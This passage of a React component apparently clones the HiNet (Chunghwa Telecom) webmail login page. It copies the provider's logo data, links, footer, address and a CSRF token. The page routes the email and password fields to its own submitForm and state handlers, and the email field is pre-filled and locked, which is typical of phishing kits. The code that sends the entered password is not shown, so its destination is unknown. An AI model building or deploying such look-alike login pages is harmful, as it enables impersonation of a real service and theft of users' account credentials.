pERDhGNDRENDVDOEUxMUUzOTJCQTk4MzQ1ODhFODM1QyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpERDhGNDRENTVDOEUxMUUzOTJCQTk4MzQ1ODhFODM1QyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PgH//v38+/r5+Pf29fTz8vHw7+7t7Ovq6ejn5uXk4+Lh4N/e3dzb2tnY19bV1NPS0dDPzs3My8rJyMfGxcTDwsHAv769vLu6ubi3trW0s7KxsK+urayrqqmop6alpKOioaCfnp2cm5qZmJeWlZSTkpGQj46NjIuKiYiHhoWEg4KBgH9+fXx7enl4d3Z1dHNycXBvbm1sa2ppaGdmZWRjYmFgX15dXFtaWVhXVlVUU1JRUE9OTUxLSklIR0ZFRENCQUA/Pj08Ozo5ODc2NTQzMjEwLy4tLCsqKSgnJiUkIyIhIB8eHRwbGhkYFxYVFBMSERAPDg0MCwoJCAcGBQQDAgEAACH5BAEAAP8ALAAAAABSACAAAAj/AP8JHEiwoMGDCBMqXMiwYUMLVpSYU6Ui15lODjNq3JjwkxVlOR7IsPFgxBBiMTiqXKlQFC88DjZ9kOJilIVRh6SsGOGHpU+WUowt2FTBAkaENKjR+Mm0YSd7eHJUaeCwmaKmWBHqwtYETi2NvHxkHTvQ0YIzGmfp+xbLGdmsMBSx8mQgFZK79Eb9M3A3VSoznTodSxYAQCh83t4y5aKnj0BV/iJHfvZvjOTIvpYF2PyKBTMM3RSz1OBjkkAalyP/E5XanyVYAIIBMJHoxQsFolXCGWFmYOsl/zSkTjPEVahQLGr/+AEt98ZJvAd+am3kH57UojpYS1T7xQ8UKHA7/2doQcgUJtMITkhd4B+B1FH+rchnezl4FO/GL+wDgYEcPZ4MREtrvcGTWhD/fLLGPvaBp4AoohAUYUEG0LNFG2roggpLo6ChRhvrTNGCBx7IwYgFA4GTGjwxqJNaE//EsUA1BZBzTjq9uPNPDwvIIAMETAxSUCerDGDkBbvY45Ao5kCgpEBGrMCIHCDIoAcueeTRDi0DndDal4XoQMQOUhAwjR+9DcTFHIggwkkYBblBIiKMCKGROXLIUQRB61zBTwsVEFCABBFwM1ACX7a2yTg2tJCaJQSBAgYuuOAwDkE6ILOIBIFksBEF4VyjA0GK8JOHof9AQo1eviUqWQZAPP/QzCdEpFYQNmGwgaUyA7kQBhH84IIMOxvds0cjBMVBBy4HoPhPCn8QNIWrWACxTSZOSPKPOKmhKlArl+wQCAi4lDDQOEPMwUYesjRVCRs4ZDJQDTO0MVARrWFRQB+XULOABhG60JoLBAECQxOIeABCLgJlsYIegVBqGkEh0NCbATgFOJAnh6Q00CHtsBFBDQRtw4Q6/xzywBcdyHJHH5lckoMsjmzjSAUCeXmZEgSdock/C0R8BcmgrBAHEYvgMEyyg1zgQyTrcEAEEyH8A4MKDtxARLQDDSIHPzwYBMoDUMxwyy8OjACFMENoYogh+PrDxT+jDExQNa384wMnIFz/cUgbjhgACS6LLPLIQIZcwAmMjUTAACfyClQLE5ggU8i8RCCyxhMHiVLGFF10YUkfG5SjjQy2/kNIarz2usM/DbSg6wGflMC5HvB+4WwpfATSwVcagIHDATAMpAEyeYygHiKBwIgQJamhg0BrVgjUGskDTQOOeyDIwcYFCyTxDzi64kCKQJbw4cERpghERqXzEDQDljgLRIsdHiCD4EGdpAbFP55IzRe+Eo3UXKIgKzjEP56wLEpd6h8zQAQb2hEPALagTTkQiChuwAkwCGIgBKADPw5QNffhIhALSIgvUtODf/AiNXfIWWqKN5AemOsfNOgeDjoQIQKojx9cowQi/4RFAoF0wXuAINW66rGxFgRiEdU7SABTY4B/2A0YrSmIFvL2Dy2AIA8R0NY/hsCPRVxjKf+QgQcCMYwqGgACmLhAPCyAlkJkwwNEkEQDPvGPLpAITp4oIUEMkRpI/MMSqQGOFbM4kDZw7R+aWAQY3iCQLTDihJ4SSAsoxbB/qIBNYauAFP4xiIRF4h86KJ4a5+CL4FSHIA1ojV50JhmSSYGRAyHGNgYCCBx4SwVyUNjcBLIDfhyhBiGAAw/AkIdHSKOFLjgAP66gAQJwLgRgCIQdaNEKtBSEG6lxwiIvQwGB8OBAAvGEODZwhRFsD2hewEga+nEACUjgFOj4gEA+0WcBZIxDAB/ohBfW4IX9eWITR1iDJka5F3kQagkEOIgOlgAEAVS0Dv9IQhQcUQIe2E4gNqMCFZTRjIE0QAWRKMEfQCEQNCjwH6aoggj2sAcxiKEMAnrCG5wFQIOMglUDgcEbaGALgwQEADs="
                          alt="HiMail"
                        />
                      </div>
                      <form name="business" onSubmit={submitForm}>
                        <input type="hidden" name="https" defaultValue={1} />
                        <input type="hidden" name="lang" defaultValue="en" />
                        <div style={{ textAlign: "center" }}>
                          <span
                            id="businessMessage"
                            style={{
                              color: "rgba(30, 53, 108, 0.5)",
                              letterSpacing: "1px",
                            }}
                            className="f16"
                          >
                            Enter email/password
                          </span>
                        </div>
                        <div
                          className="ctrlGroup"
                          style={{ lineHeight: "24px" }}
                        >
                          <div className="user_icon">
                            <svg
                              aria-hidden="true"
                              focusable="false"
                              data-prefix="fas"
                              data-icon="envelope"
                              className="svg-inline--fa fa-envelope fa-w-16"
                              role="img"
                              xmlns="http://www.w3.org/2000/svg"
                              viewBox="0 0 512 512"
                            >
                              <path
                                fill="currentColor"
                                d="M502.3 190.8c3.9-3.1 9.7-.2 9.7 4.7V400c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V195.6c0-5 5.7-7.8 9.7-4.7 22.4 17.4 52.1 39.5 154.1 113.6 21.1 15.4 56.7 47.8 92.2 47.6 35.7.3 72-32.8 92.3-47.6 102-74.1 131.6-96.3 154-113.7zM256 320c23.2.4 56.6-29.2 73.4-41.4 132.7-96.3 142.8-104.7 173.4-128.7 5.8-4.5 9.2-11.5 9.2-18.9v-19c0-26.5-21.5-48-48-48H48C21.5 64 0 85.5 0 112v19c0 7.4 3.4 14.3 9.2 18.9 30.6 23.9 40.7 32.4 173.4 128.7 16.8 12.2 50.2 41.8 73.4 41.4z"
                              />
                            </svg>
                          </div>
                          <label htmlFor="idBizuser" className="loginLabel" />
                          <input
                            id="idBizuser"
                            placeholder="E-mail"
                            name="username"
                            disabled
                            onChange={handleChange}
                            value={values.username}
                            tabIndex={7}
                            size={16}
                            onkeyup="checkTheSame(document.business)"
                            title="Account@domain(Ex: john@ilovehimail.com.tw)"
                            className="inputTxt"
                          />
                          <img
                            id="show_username_keyboard"
                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAANCAYAAABLjFUnAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAPtJREFUeNpibGpqusTAwKDLQDm4zARl2AIxIwUYpJ+BiYGKANmwpUD8H4jlgPgwlM0ApUF8Gyi7HYijoGwQnobNsPtAfBaIfwHxTSibAUqD+F+g7KdA/A6Ir6G7jAWJXQPFIJCCJG6Cgw0y9BIhb4LwFiD2RvJWBZTtDfXyQ2xhxoLFmyBwB4g/InkL5sWPUC+D6O9QsUfYDJsLxOtB6QWIVYCYE4jTkeRh7OlQw59CxV5DIw3FsBZoLMkD8QoCCfkIEGcB8Rmo4cvQDdsHtRGE1wDxcTyG3YHG6CyowSjeVAfiC1CsCMRbiUijElDDQMAA2bA51MibAAEGAJEWSOMD5WGDAAAAAElFTkSuQmCC"
                            title="Show virtual keyboard to input username!"
                            className="imgKB"
                          />
                        </div>
                        <div
                          className="ctrlGroup"
                          style={{ lineHeight: "24px" }}
                        >
                          <div className="user_icon">
                            <svg
                              aria-hidden="true"
                              focusable="false"
                              data-prefix="fas"
                              data-icon="lock"
                              className="svg-inline--fa fa-lock fa-w-14"
                              role="img"
                              xmlns="http://www.w3.org/2000/svg"
                              viewBox="0 0 448 512"
                            >
                              <path
                                fill="currentColor"
                                d="M400 224h-24v-72C376 68.2 307.8 0 224 0S72 68.2 72 152v72H48c-26.5 0-48 21.5-48 48v192c0 26.5 21.5 48 48 48h352c26.5 0 48-21.5 48-48V272c0-26.5-21.5-48-48-48zm-104 0H152v-72c0-39.7 32.3-72 72-72s72 32.3 72 72v72z"
                              />
                            </svg>
                          </div>
                          <label htmlFor="passBizuser" className="loginLabel" />
                          <input
                            id="passBizuser"
                            placeholder="Password"
                            name="password"
                            value={values.password}
                            onChange={handleChange}
                            required
                            tabIndex={8}
                            type="password"
                            maxLength={255}
                            size={16}
                            className="inputTxt"
                          />
                          <img
                            id="showkeyboard"
                            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAANCAYAAABLjFUnAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAPtJREFUeNpibGpqusTAwKDLQDm4zARl2AIxIwUYpJ+BiYGKANmwpUD8H4jlgPgwlM0ApUF8Gyi7HYijoGwQnobNsPtAfBaIfwHxTSibAUqD+F+g7KdA/A6Ir6G7jAWJXQPFIJCCJG6Cgw0y9BIhb4LwFiD2RvJWBZTtDfXyQ2xhxoLFmyBwB4g/InkL5sWPUC+D6O9QsUfYDJsLxOtB6QWIVYCYE4jTkeRh7OlQw59CxV5DIw3FsBZoLMkD8QoCCfkIEGcB8Rmo4cvQDdsHtRGE1wDxcTyG3YHG6CyowSjeVAfiC1CsCMRbiUijElDDQMAA2bA51MibAAEGAJEWSOMD5WGDAAAAAElFTkSuQmCC"
                            title="Show virtual keyboard to input password!"
                            className="imgKB"
                          />
                        </div>
                        <div
                          className="ctrlGroup"
                          style={{ marginBottom: "4px" }}
                        >
                          <div
                            className="savebtn"
                            style={{ marginLeft: "27px" }}
                          >
                            <input
                              id="saveaccBizuser"
                              tabIndex={9}
                              aligh="right"
                              onclick="switchSavePasswd(document.business);"
                              type="checkbox"
                              defaultValue={1}
                              name="saveAccount"
                            />
                            <label
                              htmlFor="saveaccBizuser"
                              className="checkboxLabel"
                            >
                              Keep email
                            </label>
                            <input
                              id="savepwBizuser"
                              aligh="right"
                              onclick="switchSaveAccount(document.business);"
                              tabIndex={10}
                              type="checkbox"
                              defaultValue={1}
                              name="savePasswd"
                            />
                            <label
                              htmlFor="savepwBizuser"
                              className="checkboxLabel"
                            >
                              Keep password
                            </label>
                          </div>
                        </div>
                        <input
                          type="submit"
                          defaultValue="Ok"
                          className="okbtn"
                          name="OK"
                          id="OKPuser"
                        />
                        <hr style={{ marginBottom: "8px" }} />
                        <div
                          className="ctrlGroup divTable"
                          style={{ marginTop: "9px" }}
                        >
                          <div className="col50L">
                            <a
                              href="https://lib.webmail.hinet.net/statement/F-account-1.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">New Account</span>
                            </a>
                          </div>
                          <div className="col50R">
                            <a
                              href="https://lib.webmail.hinet.net/statement/manual_v20200330.pdf"
                              target="_blank"
                            >
                              <span className="toolboxLabel">Instructions</span>
                            </a>
                          </div>
                          <div className="col50L">
                            <a
                              href="https://lib.webmail.hinet.net/statement/F-login-5.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">
                                Forget password?
                              </span>
                            </a>
                          </div>
                          <div className="col50R">
                            <a
                              href="https://lib.webmail.hinet.net/statement/login_info.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">
                                Login instructions
                              </span>
                            </a>
                          </div>
                          <div className="col50L">
                            <a
                              href="https://lib.webmail.hinet.net/statement/M-help-1.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">FAQ</span>
                            </a>
                          </div>
                          <div className="col50R">
                            <a
                              href="https://lib.webmail.hinet.net/statement/termsvs.htm"
                              target="_blank"
                            >
                              <span className="toolboxLabel">
                                Service terms
                              </span>
                            </a>
                          </div>
                        </div>
                        <input
                          type="hidden"
                          name="owaspcsrftkn"
                          defaultValue="TLXQ-QVRG-N7GW-CAGE-OLIP-P99K-CGAY-OZ70"
                        />
                      </form>
                    </div>
                  </div>
                </div>
                <div id="keyboard" className="ui-draggable ui-draggable-handle">
                  <div id="shuffleDiv">
                    <table width="100%">
                      <tbody>
                        <tr>
                          <td>
                            <input
                              type="button"
                              defaultValue="Shuffle"
                              id="shuffle"
                              className="butF"
                            />
                          </td>
                          <td align="right">
                            <input
                              type="button"
                              defaultValue="Reset"
                              id="Reset"
                              className="butF"
                            />
                            &nbsp;&nbsp;
                          </td>
                        </tr>
                      </tbody>
                    </table>
                  </div>
                  <div id="row0">
                    <input
                      name="accent"
                      type="button"
                      defaultValue="`"
                      className="butS"
                    />
                    <input
                      name={1}
                      type="button"
                      defaultValue={1}
                      className="butI"
                    />
                    <input
                      name={2}
                      type="button"
                      defaultValue={2}
                      className="butI"
                    />
                    <input
                      name={3}
                      type="button"
                      defaultValue={3}
                      className="butI"
                    />
                    <input
                      name={4}
                      type="button"
                      defaultValue={4}
                      className="butI"
                    />
                    <input
                      name={5}
                      type="button"
                      defaultValue={5}
                      className="butI"
                    />
                    <input
                      name={6}
                      type="button"
                      defaultValue={6}
                      className="butI"
                    />
                    <input
                      name={7}
                      type="button"
                      defaultValue={7}
                      className="butI"
                    />
                    <input
                      name={8}
                      type="button"
                      defaultValue={8}
                      className="butI"
                    />
                    <input
                      name={9}
                      type="button"
                      defaultValue={9}
                      className="butI"
                    />
                    <input
                      name={0}
                      type="button"
                      defaultValue={0}
                      className="butI"
                    />
                    <input
                      name="hyphen"
                      type="button"
                      defaultValue="-"
                      className="butS"
                    />
                    <input
                      name="equal"
                      type="button"
                      defaultValue="="
                      className="butS"
                    />
                    <input
                      name="backspace"
                      type="button"
                      defaultValue="←"
                      id="backspace"
                    />
                  </div>
                  <div id="row0_shift">
                    <input
                      name="tilde"
                      type="button"
                      defaultValue="~"
                      className="butS"
                    />
                    <input
                      name="exc"
                      type="button"
                      defaultValue="!"
                      className="butS"
                    />
                    <input
                      name="at"
                      type="button"
                      defaultValue="@"
                      className="butS"
                    />
                    <input
                      name="hash"
                      type="button"
                      defaultValue="#"
                      className="butS"
                    />
                    <input
                      name="dollar"
                      type="button"
                      defaultValue="$"
                      className="butS"
                    />
                    <input
                      name="percent"
                      type="button"
                      defaultValue="%"
                      className="butS"
                    />
                    <input
                      name="caret"
                      type="button"
                      defaultValue="^"
                      className="butS"
                    />
                    <input
                      name="ampersand"
                      type="button"
                      defaultValue="&"
                      className="butS"
                    />
                    <input
                      name="asterisk"
                      type="button"
                      defaultValue="*"
                      className="butS"
                    />
                    <input
                      name="leftbracket"
                      type="button"
                      defaultValue="("
                      className="butS"
                    />
                    <input
                      name="rightbracket"
                      type="button"
                      defaultValue=")"
                      className="butS"
                    />
                    <input
                      name="underscore"
                      type="button"
                      defaultValue="_"
                      className="butS"
                    />
                    <input
                      name="plus"
                      type="button"
                      defaultValue="+"
                      className="butS"
                    />
                    <input
                      name="backspace"
                      type="button"
                      defaultValue="←"
                      id="backspace"
                    />
                  </div>
                  <div id="row1">
                    <input
                      name="q"
                      type="button"
                      defaultValue="q"
                      className="butW"
                    />
                    <input
                      name="w"
                      type="button"
                      defaultValue="w"
                      className="butW"
                    />
                    <input
                      name="e"
                      type="button"
                      defaultValue="e"
                      className="butW"
                    />
                    <input
                      name="r"
                      type="button"
                      defaultValue="r"
                      className="butW"
                    />
                    <input
                      name="t"
                      type="button"
                      defaultValue="t"
                      className="butW"
                    />
                    <input
                      name="y"
                      type="button"
                      defaultValue="y"
                      className="butW"
                    />
                    <input
                      name="u"
                      type="button"
                      defaultValue="u"
                      className="butW"
                    />
                    <input
                      name="i"
                      type="button"
                      defaultValue="i"
                      className="butW"
                    />
                    <input
                      name="o"
                      type="button"
                      defaultValue="o"
                      className="butW"
                    />
                    <input
                      name="p"
                      type="button"
                      defaultValue="p"
                      className="butW"
                    />
                    <input
                      name="["
                      type="button"
                      defaultValue="["
                      className="butS"
                    />
                    <input
                      name="]"
                      type="button"
                      defaultValue="]"
                      className="butS"
                    />
                    <input
                      name="backslash"
                      type="button"
                      defaultValue="\"
                      className="butS"
                    />
                  </div>
                  <div id="row1_shift">
                    <input
                      name="Q"
                      type="button"
                      defaultValue="Q"
                      className="butW"
                    />
                    <input
                      name="W"
                      type="button"
                      defaultValue="W"
                      className="butW"
                    />
                    <input
                      name="E"
                      type="button"
                      defaultValue="E"
                      className="butW"
                    />
                    <input
                      name="R"
                      type="button"
                      defaultValue="R"
                      className="butW"
                    />
                    <input
                      name="T"
                      type="button"
                      defaultValue="T"
                      className="butW"
                    />
                    <input
                      name="Y"
                      type="button"
                      defaultValue="Y"
                      className="butW"
                    />
                    <input
                      name="U"
                      type="button"
                      defaultValue="U"
                      className="butW"
                    />
                    <input
                      name="I"
                      type="button"
                      defaultValue="I"
                      className="butW"
                    />
                    <input
                      name="O"
                      type="button"
                      defaultValue="O"
                      className="butW"
                    />
                    <input
                      name="P"
                      type="button"
                      defaultValue="P"
                      className="butW"
                    />
                    <input
                      name="{"
                      type="button"
                      defaultValue="{"
                      className="butS"
                    />
                    <input
                      name="}"
                      type="button"
                      defaultValue="}"
                      className="butS"
                    />
                    <input
                      name="pipe"
                      type="button"
                      defaultValue="|"
                      className="butS"
                    />
                  </div>
                  <div id="row2">
                    <input
                      name="a"
                      type="button"
                      defaultValue="a"
                      className="butW"
                    />
                    <input
                      name="s"
                      type="button"
                      defaultValue="s"
                      className="butW"
                    />
                    <input
                      name="d"
                      type="button"
                      defaultValue="d"
                      className="butW"
                    />
                    <input
                      name="f"
                      type="button"
                      defaultValue="f"
                      className="butW"
                    />
                    <input
                      name="g"
                      type="button"
                      defaultValue="g"
                      className="butW"
                    />
                    <input
                      name="h"
                      type="button"
                      defaultValue="h"
                      className="butW"
                    />
                    <input
                      name="j"
                      type="button"
                      defaultValue="j"
                      className="butW"
                    />
                    <input
                      name="k"
                      type="button"
                      defaultValue="k"
                      className="butW"
                    />
                    <input
                      name="l"
                      type="button"
                      defaultValue="l"
                      className="butW"
                    />
                    <input
                      name="semi-colon"
                      type="button"
                      defaultValue=";"
                      className="butS"
                    />
                    <input
                      name="apostrophe"
                      type="button"
                      defaultValue="'"
                      className="butS"
                    />
                  </div>
                  <div id="row2_shift">
                    <input
                      name="a"
                      type="button"
                      defaultValue="A"
                      className="butW"
                    />
                    <input
                      name="s"
                      type="button"
                      defaultValue="S"
                      className="butW"
                    />
                    <input
                      name="d"
                      type="button"
                      defaultValue="D"
                      className="butW"
                    />
                    <input
                      name="f"
                      type="button"
                      defaultValue="F"
                      className="butW"
                    />
                    <input
                      name="g"
                      type="button"
                      defaultValue="G"
                      className="butW"
                    />
                    <input
                      name="h"
                      type="button"
                      defaultValue="H"
                      className="butW"
                    />
                    <input
                      name="j"
                      type="button"
                      defaultValue="J"
                      className="butW"
                    />
                    <input
                      name="k"
                      type="button"
                      defaultValue="K"
                      className="butW"
                    />
                    <input
                      name="l"
                      type="button"
                      defaultValue="L"
                      className="butW"
                    />
                    <input
                      name="colon"
                      type="button"
                      defaultValue=":"
                      className="butS"
                    />
                    <input
                      name="quote"
                      type="button"
                      defaultValue='"'
                      className="butS"
                    />
                  </div>
                  <div id="row3">
                    <input
                      name="Shift"
                      type="button"
                      defaultValue="Shift"
                      id="shift"
                      title="Click to show more characters/symbols"
                    />
                    <input
                      name="z"
                      type="button"
                      defaultValue="z"
                      className="butW"
                    />
                    <input
                      name="x"
                      type="button"
                      defaultValue="x"
                      className="butW"
                    />
                    <input
                      name="c"
                      type="button"
                      defaultValue="c"
                      className="butW"
                    />
                    <input
                      name="v"
                      type="button"
                      defaultValue="v"
                      className="butW"
                    />
                    <input
                      name="b"
                      type="button"
                      defaultValue="b"
                      className="butW"
                    />
                    <input
                      name="n"
                      type="button"
                      defaultValue="n"
                      className="butW"
                    />
                    <input
                      name="m"
                      type="button"
                      defaultValue="m"
                      className="butW"
                    />
                    <input
                      name="comma "
                      type="button"
                      defaultValue=","
                      className="butS"
                    />
                    <input
                      name="period"
                      type="button"
                      defaultValue="."
                      className="butS"
                    />
                    <input
                      name="forward_slash"
                      type="button"
                      defaultValue="/"
                      className="butS"
                    />
                  </div>
                  <div id="row3_shift">
                    <input
                      name="Shift"
                      type="button"
                      defaultValue="Shift"
                      id="shifton"
                      title="Click to show more characters/symbols"
                    />
                    <input
                      name="Z"
                      type="button"
                      defaultValue="Z"
                      className="butW"
                    />
                    <input
                      name="X"
                      type="button"
                      defaultValue="X"
                      className="butW"
                    />
                    <input
                      name="C"
                      type="button"
                      defaultValue="C"
                      className="butW"
                    />
                    <input
                      name="V"
                      type="button"
                      defaultValue="V"
                      className="butW"
                    />
                    <input
                      name="B"
                      type="button"
                      defaultValue="B"
                      className="butW"
                    />
                    <input
                      name="N"
                      type="button"
                      defaultValue="N"
                      className="butW"
                    />
                    <input
                      name="M"
                      type="button"
                      defaultValue="M"
                      className="butW"
                    />
                    <input
                      name="lt"
                      type="button"
                      defaultValue="<"
                      className="butS"
                    />
                    <input
                      name="gt"
                      type="button"
                      defaultValue=">"
                      className="butS"
                    />
                    <input
                      name="questionmark"
                      type="button"
                      defaultValue="?"
                      className="butS"
                    />
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div id="spacer" className="flex_item" />
        <div id="tail" className="flex_item">
          <footer>
            <div className="container">
              <div className="footer_text">
                <div style={{ marginTop: "3px" }}>
                  |
                  <a
                    href="https://lib.webmail.hinet.net/statement/privacy.htm"
                    target="_blank"
                  >
                    Privacy Protection
                  </a>
                  |
                  <a href="https://www.hinet.net/sitemap.html" target="_blank">
                    Site Map
                  </a>
                  |
                  <a
                    href="https://www.hinet.net/app/ad_normal.html"
                    target="_blank"
                  >
                    Advertisement
                  </a>
                  |
                  <a
                    href="https://lib.webmail.hinet.net/statement/notify.htm"
                    target="_blank"
                  >
                    System Announcement
                  </a>
                  |
                  <a
                    href="https://www.cht.com.tw/home/consumer/member/fttxservice"
                    target="_blank"
                  >
                    Contact Us
                  </a>
                  |
                </div>
                <div style={{ marginTop: "3px" }}>
                  <img
                    src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAUCAYAAAD/Rn+7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyRpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoTWFjaW50b3NoKSIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoyMzA3RDVFNUQ3RTkxMUVCQUVEMUU5QzA5MUY4MkI3RSIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoyMzA3RDVFNkQ3RTkxMUVCQUVEMUU5QzA5MUY4MkI3RSI+IDx4bXBNTTpEZXJpdmVkRnJvbSBzdFJlZjppbnN0YW5jZUlEPSJ4bXAuaWlkOjIzMDdENUUzRDdFOTExRUJBRUQxRTlDMDkxRjgyQjdFIiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjIzMDdENUU0RDdFOTExRUJBRUQxRTlDMDkxRjgyQjdFIi8+IDwvcmRmOkRlc2NyaXB0aW9uPiA8L3JkZjpSREY+IDwveDp4bXBtZXRhPiA8P3hwYWNrZXQgZW5kPSJyIj8+bTedFQAAAzxJREFUeNrMlm1Ik1EUx++zUnIzTedc+Va6aZqYWUZGGbP8Ikgl1KcELQyxoPpQWCQREQhR3wqzMCyjD0FlJqR9qKWlvZiwCjRS8DUyyZlus6ay/mfexdPY3IsP0YUf59l97nPvf+fec84VbDYb+5+b4BAoCIKkE9/otmhg8sFWEA9GwUtw+UCyfNzT9390SS0QwnJhToHtboZ0g40QafJG4GIJPaaGqQa7PAxNBqXgkjfzyiQSlwPz3o04Pchw6svydm6ZBOKKYZpBpIvXd0AFOAY2g3e8f9bb+X3e4i8sPBiGzpm+qXvoIOyFeYbHgBTQx4PlJmgE7T4LFHTV0TAqMGXTl34S9cfBhAMT+nu4oDKTJrEDNnNszMxM5l9MHhTIIiKCHZ9dHRmZyDVbrLF41p7PizsJT9fi+QyCY8BlOtFVp8EsAgNYZ8yVB0+Ao8AA1on6z4Ei8Bzo7NskCNPDBXvt5+rBIwNra++1Z4GiwiyWvUVL3VVV11tyBoeM2qCggATqgLBiD85qBaFgP6j1e4u1eRcDNfEq6yqVUlHglBZq69qZ0WhhO/PXGiYnf1LOW52aEpX79rHdQ8vJ85RigBwMgyegjke0gk91BGNXwFa6E5iOAW7LS5JWXWL4MKSYnvn7nGsSVIy2+2GjgRnHLRA8F4Adnf0NmI8EvQG05bdAExdLnloDnvHUQ3o6wev5oriLZ34H90QRG6FUKtJcCVerQ9jp8jwWFbWMtbz4zH5MTG0S6+fiqFF/OQjhxykRZ64B1srft+H30/kEWjGgzwEFh+jdIZlMCHDn3bAw+WhZSfa+SNXSfqe5u3iZo/YN3OVbulIU0d+5LYTHj7s6g+R2qpFfndat52mCOJyWGs3kckSsci5i16fH4lnB4mLC7X8YHgw8W5F/+1pNaxKie6and7Qef3QGi+p4esrgWaGGUhXeveLr7AG7wRIw4vNlAdtLH5q9TO7bAB2FUERvpT8FwJ9arPah8rSAHIjTL7RS+VLqTD6MNfI08m/vg9hmqh4bPAy7T7UX3htciDC/7oMQmEnFg9dYcRvnwq5AWKcUnvP7wsqDZQfPkRQ0Hym5Qtgsk7A5dP0WYABUjyV/EYxZjAAAAABJRU5ErkJggg=="
                    width={40}
                    height={20}
                    style={{ verticalAlign: "middle" }}
                  />
                  <span
                    style={{
                      verticalAlign: "middle",
                      marginLeft: "3px",
                      color: "#a7a5a5",
                    }}
                  >
                    Chunghwa Telecom Data Communication　Address: No.21, Sec. 1,
                    Sinyi Rd., Taipei City 100 24-Hour Toll Free Line:
                    0800-080-412
                  </span>
                </div>
                <div style={{ marginTop: "3px", color: "#a7a5a5" }}>
                  © Copyright 2021 HiNet Internet Service by Chunghwa Telecom.
                </div>
              </div>
            </div>
          </footer>
        </div>
      </div>
    </Fragment>
  );
}
